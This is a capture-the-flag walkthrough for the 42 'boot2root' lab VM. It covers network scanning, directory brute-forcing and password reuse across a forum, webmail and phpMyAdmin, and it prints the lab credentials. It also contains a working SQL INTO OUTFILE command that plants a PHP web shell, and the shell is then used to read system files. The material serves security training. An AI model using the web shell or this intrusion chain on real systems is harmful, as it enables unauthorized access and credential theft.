<!-- 
The Penetration Testing Execution Standard (PTES; 2014) framework is a pen testing methodology that encompasses seven sections:

    Pre-engagement interactions
    Intelligence gathering
    Threat modeling
    Vulnerability analysis
    Exploitation
    Post-exploitation
    Reporting

PTES (2012) also provides an extensive technical guide that enables pen testers to execute the methodology. -->


# boot2root
Search for various means to pass root on the ISO given to you (42 project)

## How to check subnet address ?

We must get host IP.  

```bash
$ifconfig
enp0s8: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 192.168.56.106  netmask 255.255.255.0  broadcast 192.168.56.255
...
```

We must [get](https://www.baeldung.com/linux/lan-ip-addresses) the IP address of this machine.  

```bash
$nmap -sP 192.168.56.106/24
Starting Nmap 7.93 ( https://nmap.org ) at 2024-04-10 08:45 BST
Nmap scan report for bess-f2r1s9.clusters.42paris.fr (192.168.56.1)
Host is up (0.00080s latency).
Nmap scan report for BornToSec ([192.168.56.101])
Host is up (0.0018s latency).
Nmap scan report for 192.168.56.106
Host is up (0.00092s latency).
Nmap done: 256 IP addresses (3 hosts up) scanned in 2.42 seconds
```
With `-sP` (no port scan), nmap doesn´t analyze ports of each address. So it's faster.


## Intelligence gathering

### Banner grabbing

Now we known address of our VM, we want obtain informations.

```bash
$nmap -A -p- $IP
Starting Nmap 7.93 ( https://nmap.org ) at 2024-04-10 08:58 BST
Nmap scan report for BornToSec (192.168.56.101)
Host is up (0.000069s latency).
Not shown: 65529 closed tcp ports (conn-refused)
PORT    STATE SERVICE    VERSION
21/tcp  open  ftp        vsftpd 2.0.8 or later
|_ftp-anon: got code 500 "OOPS: vsftpd: refusing to run with writable root inside chroot()".
22/tcp  open  ssh        OpenSSH 5.9p1 Debian 5ubuntu1.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   1024 07bf0220f08ac8481efc41aea446fa25 (DSA)
|   2048 26dd80a3dfc44b531e534246ef6e30b2 (RSA)
|_  256 cfc38c31d7477c84e2d21631b28e63a7 (ECDSA)
80/tcp  open  http       Apache httpd 2.2.22 ((Ubuntu))
|_http-title: Hack me if you can
|_http-server-header: Apache/2.2.22 (Ubuntu)
143/tcp open  imap       Dovecot imapd
|_imap-capabilities: IMAP4rev1 more LITERAL+ have OK post-login LOGIN-REFERRALS ENABLE IDLE listed STARTTLS LOGINDISABLEDA0001 Pre-login ID SASL-IR capabilities
|_ssl-date: 2024-04-10T07:59:23+00:00; +7s from scanner time.
443/tcp open  ssl/http   Apache httpd 2.2.22
|_http-title: 404 Not Found
|_ssl-date: 2024-04-10T07:59:23+00:00; +7s from scanner time.
| ssl-cert: Subject: commonName=BornToSec
| Not valid before: 2015-10-08T00:19:46
|_Not valid after:  2025-10-05T00:19:46
|_http-server-header: Apache/2.2.22 (Ubuntu)
993/tcp open  ssl/imaps?
|_ssl-date: 2024-04-10T07:59:23+00:00; +7s from scanner time.
| ssl-cert: Subject: commonName=localhost/organizationName=Dovecot mail server
| Not valid before: 2015-10-08T20:57:30
|_Not valid after:  2025-10-07T20:57:30
Service Info: Host: 127.0.1.1; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: 6s, deviation: 0s, median: 6s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 25.31 seconds

```
With `-A` option we can detect all elements (script, OS, version and traceroute).
`-p-` scan all ports.


### http server

We can use gobuster to find pages hidden using list of words.

```bash
$gobuster dir -u $IP -w /usr/share/wordlists/dirb/big.txt
...
/.htaccess            (Status: 403) [Size: 291]
/.htpasswd            (Status: 403) [Size: 291]
/cgi-bin/             (Status: 403) [Size: 290]
/fonts                (Status: 301) [Size: 316] [--> http://192.168.56.101/fonts/]
/forum                (Status: 403) [Size: 287]                                   
/server-status        (Status: 403) [Size: 295]                                   
```
Here, a lot of pages have permissions restrictions. No pages are available.  


Now we can analyze http server with ssl certificate.  

```bash
$gobuster dir -u $IP:443 -w /usr/share/wordlists/dirb/big.txt -k
...
/cgi-bin/             (Status: 403) [Size: 291]
/forum                (Status: 301) [Size: 318] [--> https://192.168.56.101/forum/]
/phpmyadmin           (Status: 301) [Size: 323] [--> https://192.168.56.101/phpmyadmin/]
/server-status        (Status: 403) [Size: 296]                                         
/webmail              (Status: 301) [Size: 320] [--> https://192.168.56.101/webmail/]   

```

`-k` option is used to skip SSL certificate verification. Without this option we can´t launch command.
We have a lot of pages allowed without permission.  
We can analyze each pages to obtains anothers pages:

```bash
$gobuster dir -u https://192.168.56.101/forum/ -w /usr/share/wordlists/dirb/big.txt -k
...
/.htaccess            (Status: 403) [Size: 298]
/.htpasswd            (Status: 403) [Size: 298]
/backup               (Status: 403) [Size: 295]
/config               (Status: 403) [Size: 295]
/images               (Status: 301) [Size: 325] [--> https://192.168.56.101/forum/images/]
/includes             (Status: 301) [Size: 327] [--> https://192.168.56.101/forum/includes/]
/index                (Status: 200) [Size: 4935]                                            
/js                   (Status: 301) [Size: 321] [--> https://192.168.56.101/forum/js/]      
/lang                 (Status: 301) [Size: 323] [--> https://192.168.56.101/forum/lang/]    
/modules              (Status: 301) [Size: 326] [--> https://192.168.56.101/forum/modules/] 
/templates_c          (Status: 301) [Size: 330] [--> https://192.168.56.101/forum/templates_c/]
/themes               (Status: 301) [Size: 325] [--> https://192.168.56.101/forum/themes/]     
/update               (Status: 301) [Size: 325] [--> https://192.168.56.101/forum/update/]     
      

$gobuster dir -u https://192.168.56.101/webmail -w /usr/share/wordlists/dirb/big.txt -k
...
/.htpasswd            (Status: 403) [Size: 300]
/.htaccess            (Status: 403) [Size: 300]
/class                (Status: 403) [Size: 296]
/config               (Status: 301) [Size: 327] [--> https://192.168.56.101/webmail/config/]
/functions            (Status: 403) [Size: 300]                                             
/help                 (Status: 403) [Size: 295]                                             
/images               (Status: 301) [Size: 327] [--> https://192.168.56.101/webmail/images/]
/include              (Status: 403) [Size: 298]                                             
/locale               (Status: 403) [Size: 297]                                             
/plugins              (Status: 301) [Size: 328] [--> https://192.168.56.101/webmail/plugins/]
/po                   (Status: 403) [Size: 293]                                              
/src                  (Status: 301) [Size: 324] [--> https://192.168.56.101/webmail/src/]    
/themes               (Status: 301) [Size: 327] [--> https://192.168.56.101/webmail/themes/] 


$gobuster dir -u https://192.168.56.101//phpmyadmin -w /usr/share/wordlists/dirb/big.txt -k
...
/.htaccess            (Status: 403) [Size: 303]
/.htpasswd            (Status: 403) [Size: 303]
/favicon.ico          (Status: 200) [Size: 18902]
/js                   (Status: 301) [Size: 326] [--> https://192.168.56.101/phpmyadmin/js/]
/libraries            (Status: 403) [Size: 303]                                            
/locale               (Status: 301) [Size: 330] [--> https://192.168.56.101/phpmyadmin/locale/]
/pmd                  (Status: 301) [Size: 327] [--> https://192.168.56.101/phpmyadmin/pmd/]   
/setup                (Status: 401) [Size: 482]                                                
/themes               (Status: 301) [Size: 330] [--> https://192.168.56.101/phpmyadmin/themes/]

```

Resume: We have a lot of interresting pages :

| **SERVICE NAME** | **PAGE NAME** | **VERSION**    |
|------------------|---------------|----------------|
| My litte Forum   | forum         | 2              |
| test             | phpmyadmin    | 3.4.10.1       |
| SquirrelMail     | webmail       | 1.4.22         |
| MySQL            | NONE          | 2.3 ?          |


<!-- root@mail.borntosec.net
avec openssl -connect -->

On the page `https://192.168.56.101/forum/index.php?id=6` we have a lot a log. We can see this: 

```bash
Oct 5 08:46:01 BornToSecHackMe CRON[7549]: pam_unix(cron:session): session opened for user lmezard by (uid=1040)

Oct 5 15:52:11 BornToSecHackMe sshd[28337]: Accepted password for admin from 62.210.32.157 port 60970 ssh2

Oct 5 08:45:29 BornToSecHackMe sshd[7547]: Failed password for invalid user !q\]Ej?*5K5cy*AJ from 161.202.39.38 port 57764 ssh2
```

The last input is weird, we can suppose it's a password. So we have tried to connect us at the forum with the login `lmezard` and the password `!q\]Ej?*5K5cy*AJ`.  
It's working !  

Now we can inspect user page. We have an email `laurie@borntosec.net`.  
We can try to connect us at the `webmail` page.  
It's working !

```bash
Squirrel:
id: laurie@borntosec.net
pw: !q\]Ej?*5K5cy*AJ
```

We can inspect mail. There are 2 mails. `DB Access` and `Very interesting !!!!`.  
With the first mail we have identifiant to DB access. We can try it.  
It's working ! 

```bash 
Phpmyadmin:
id: root
pw: Fg-'kKXBj87E:aJ$
```

We can inspect it.  
We have a `forum_db` database with various table like `mlf2_userdata`.  
To have access of admin account, we have tried to change admin password by `laurie password` but it's not working.  
On the user's table we can find `pwf-code`.  
The second is a mail talking about Windev. Maybe it's related.  

```bash
pwf-code = e0f5084cfdd90f01ed10a3edf5f10b2a210b6caa6750c50627
```

On `sent mail` we have find a new email address:

```bash
ft_root@mail.borntosec.net
```

Because of the default configuration of phpmyadmin gives the user full access of mysql command we can create a [back door](https://www.informit.com/articles/article.aspx?p=1407358&seqNum=2) to the server itself.  
We can use this command in our phpmyadmin:  

```sql
select '<?php system($_GET["cmd"]); ?>' into outfile "/var/www/forum/templates_c/cmd.php";
```


ssh:
id: lmezard
pd: G!@M6f4Eatau{sF" 
https://192.168.56.101/forum/templates_c/cmd.php?cmd=cat%20/home/LOOKATME/password


total 555
drwxrwxrwx 1 www-data www-data 220 Apr 10 19:15 .
drwxr-xr-x 1 www-data www-data 60 Oct 8 2015 ..
-rwxr-xr-x 1 www-data www-data 1 Oct 8 2015 .dummy
-rwxr-xr-x 1 www-data www-data 211754 Oct 8 2015 11c603a9070a9e1cbb42569c40699569e0a53f12.file.admin.inc.tpl.php
-rwxr-xr-x 1 www-data www-data 3576 Oct 8 2015 2bd398249eb3f005dbae14690a7dd67b920a4385.file.login.inc.tpl.php
-rwxr-xr-x 1 www-data www-data 23519 Oct 8 2015 40bf370f621e4a21516f806a52da816d70d613db.file.user.inc.tpl.php
-rwxr-xr-x 1 www-data www-data 1357 Oct 8 2015 427dca884025438fd528481570ed37a00b14939c.file.ajax_preview.tpl.php
-rw-r--r-- 1 www-data www-data 1737 Apr 10 15:53 513e92ef4f008e18ded92aa2c4dd1684c631a5ab.file.login_pw_forgotten.inc.tpl.php
-rwxr-xr-x 1 www-data www-data 30987 Oct 8 2015 560a32decccbae1a5f4aeb1b9de5bef4b3f2a9e5.file.posting.inc.tpl.php
-rwxr-xr-x 1 www-data www-data 13181 Oct 8 2015 5cfe6060cd61c240ab9571e3dbb89827c6893eea.file.main.tpl.php
-rwxr-xr-x 1 www-data www-data 18923 Oct 8 2015 749c74399509c1017fd789614be8fc686bbfc981.file.user_edit.inc.tpl.php
-rwxr-xr-x 1 www-data www-data 64906 Oct 8 2015 8e2360743d8fd2dec4d073e8a0541dbe322a9482.english.lang.config.php
-rw-r--r-- 1 www-data www-data 29187 Apr 10 14:13 97af275cd5fb1778ee765d8c78c44a1858ed3a3d.file.index_table.inc.tpl.php
-rw-r--r-- 1 www-data www-data 1817 Apr 10 16:26 9fcd704f2191fbac07dc3d9816f1963c4b14715b.file.info.inc.tpl.php
-rwxr-xr-x 1 www-data www-data 12086 Oct 8 2015 ad5c544b74f3fd21e6cf286e36ee1b2d24a746b9.file.user_profile.inc.tpl.php
-rwxr-xr-x 1 www-data www-data 6343 Oct 8 2015 b2b306105b3842dc920a1d11c8bb367b28290c2a.file.subnavigation_1.inc.tpl.php
-rw-r--r-- 1 www-data www-data 18498 Apr 10 14:25 bf5efde9846e6778e20c015ef9ad13f7c2975ffe.file.search.inc.tpl.php
-rwxr-xr-x 1 www-data www-data 23284 Oct 8 2015 d0af1f95d9c68edf1f8805f6009e021a113a569a.file.entry.inc.tpl.php
-rw-r--r-- 1 www-data www-data 22041 Apr 10 11:55 e8ada6f1520745cc990d8634bf1bd1841b336231.file.thread.inc.tpl.php
-rwxr-xr-x 1 www-data www-data 6167 Oct 8 2015 e9c93976b632dda2b9bf7d2a686f72654e73a241.file.user_edit_email.inc.tpl.php
-rw-rw-rw- 1 mysql mysql 31 Apr 10 19:15 exploit.php
-rwxr-xr-x 1 www-data www-data 28820 Oct 8 2015 f13dc3b8bcb4f22c2bd24171219c43f5555f95c0.file.index.inc.tpl.php
-rwxr-xr-x 1 www-data www-data 9263 Oct 8 2015 f75851d3a324a67471c104f30409f32a790c330e.file.subnavigation_2.inc.tpl.php
-rw-r--r-- 1 www-data www-data 9717 Apr 10 14:19 f8529a8326ebb750d28f3dac8bc969240737e2a4.file.contact.inc.tpl.php

cmd = ls -la /home
drwxrwx--x 1 www-data root 60 Oct 13 2015 .
drwxr-xr-x 1 root root 220 Apr 10 09:30 ..
drwxr-x--- 2 www-data www-data 31 Oct 8 2015 LOOKATME
drwxr-x--- 6 ft_root ft_root 156 Jun 17 2017 ft_root
drwxr-x--- 3 laurie laurie 143 Oct 15 2015 laurie
drwxr-x--- 1 laurie@borntosec.net laurie@borntosec.net 60 Oct 15 2015 laurie@borntosec.net
dr-xr-x--- 2 lmezard lmezard 61 Oct 15 2015 lmezard
drwxr-x--- 3 thor thor 129 Oct 15 2015 thor
drwxr-x--- 4 zaz zaz 147 Oct 15 2015 zaz 

cmd=ls -la /home/LOOKATME
total 1 drwxr-x--- 2 www-data www-data 31 Oct 8 2015 .
drwxrwx--x 1 www-data root 60 Oct 13 2015 ..
-rwxr-x--- 1 www-data www-data 25 Oct 8 2015 password 

cmd=cat /home/LOOKATME/password
lmezard:G!@M6f4Eatau{sF" 


This id can be used on ftp server. With this access with have obtained 2 files:

```bash
$ftp $IP
220 Welcome on this server
Name (192.168.56.101:parrot): lmezard 
331 Please specify the password.
Password:
230 Login successful.
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rwxr-x---    1 1001     1001           96 Oct 15  2015 README
-rwxr-x---    1 1001     1001       808960 Oct 08  2015 fun
```
`README` file give instructions: complete the challenge to obtain password of ssh user `laurie`.
`fun` file is a mystery. Using `file` command on the file. We have seen that it was a `tar archive`. So we have extract this file to obtain a directory in wich have lot of files.  
In order to understand wich append in these files we have cat all in a single output:   

```bash
$file fun
fun: POSIX tar archive (GNU)
$tar -xf fun
$cat * > output.txt
```
We have read this file. It seems to be a puzzle of program. Each `file` has a comment with number. We have search `main` function which called `getme` functions. So we have examine all functions. We have found 2 praticals:  

* The function do nothing. So we have search at the `file + 1` to obtain informations.
```c
getme1() {

//file5

file 6 :
return 'I';

//file6
```

* The function return a char.
```c
char getme8() {
	return 'w';
}
```

In `main` function give instructions: 
```c
printf("Now SHA-256 it and submit");
```
So we have `SHA-256` the phrase `Iheartpwnage` and obtain `330b845f32185747e4f8ca15d40ca59796035c89ea809fb5d30f4da83ecf45a4`.  
Its working !
```bash
ssh laurie@192.168.56.101
        ____                _______    _____           
       |  _ \              |__   __|  / ____|          
       | |_) | ___  _ __ _ __ | | ___| (___   ___  ___ 
       |  _ < / _ \| '__| '_ \| |/ _ \\___ \ / _ \/ __|
       | |_) | (_) | |  | | | | | (_) |___) |  __/ (__ 
       |____/ \___/|_|  |_| |_|_|\___/_____/ \___|\___|

                       Good luck & Have fun
laurie@192.168.56.101's password: 
laurie@BornToSecHackMe:~$
```

